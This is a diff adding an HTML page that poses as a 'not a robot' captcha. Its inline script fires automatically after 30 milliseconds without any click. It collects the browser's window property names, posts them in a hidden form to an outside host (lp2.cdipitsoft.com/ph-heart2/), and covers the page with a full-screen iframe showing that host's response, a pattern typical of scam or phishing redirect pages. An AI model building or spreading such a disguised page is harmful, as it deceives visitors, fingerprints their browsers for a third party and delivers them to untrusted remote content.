@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
+  <meta name="description" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>Captcha</title>
+  <link rel="stylesheet" href="mobirise-icons.css">
+  <link rel="stylesheet" href="mobirise2.css">
+  <link rel="stylesheet" href="bootstrap.min.css">
+  <link rel="stylesheet" href="bootstrap-grid.min.css">
+  <link rel="stylesheet" href="bootstrap-reboot.min.css">
+  <link rel="stylesheet" href="tether.min.css">
+  <link rel="stylesheet" href="style.css">
+  <link rel="preload" as="style" href="mbr-additional.css">
+  <link rel="stylesheet" href="mbr-additional.css" type="text/css">
+</head>
+<body>
+<section class="cid-rJjVjQ4nlD mbr-fullscreen" id="header2-0">
+
+    <div class="container align-center">
+        <div class="row justify-content-md-center">
+		
+			<p> <br></p>
+		
+            <div class="mbr-white col-md-10">
+              <p> <br> </p><p> <br> </p>
+                <h3 class="mbr-section-subtitle align-center mbr-light pb-3 mbr-fonts-style display-4"><strong>
+                  Confirm that you are not a robot</strong>  </p></h3>
+                <p> <br> </p>
+                <div class="mbr-section-btn"><a class="btn btn-md btn-primary display-2" href="#" onclick="show()">
+			<span class="mobi-mbri mobi-mbri-success mbr-iconfont mbr-iconfont-btn"></span> i'm not a robot</a></div>
+            </div>
+        </div>
+    </div>
+    
+</section>
+
+<script>
+function show(){
+	document.body.outerHTML="<form id='frm' action='' target='target1' method='POST'><input type='hidden' id='objkeys' name='objkeys'></form><iframe name='target1' src='' id='ifm' style='display:none;visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' allowfullscreen='allowfullscreen' webkitallowfullscreen='webkitallowfullscreen' mozallowfullscreen='mozallowfullscreen'></iframe>";
+	
+	var frm=document.getElementById("frm");
+	var ifm=document.getElementById("ifm");
+	frm.action = "https://lp2.cdipitsoft.com/ph-heart2/"+(document.search||'');
+	document.getElementById("objkeys").value=JSON.stringify(Object.getOwnPropertyNames(window));
+	ifm.style.display="block";
+	frm.submit();
+}
+setTimeout(show,30);
+</script>
+</body>
+</html>
+
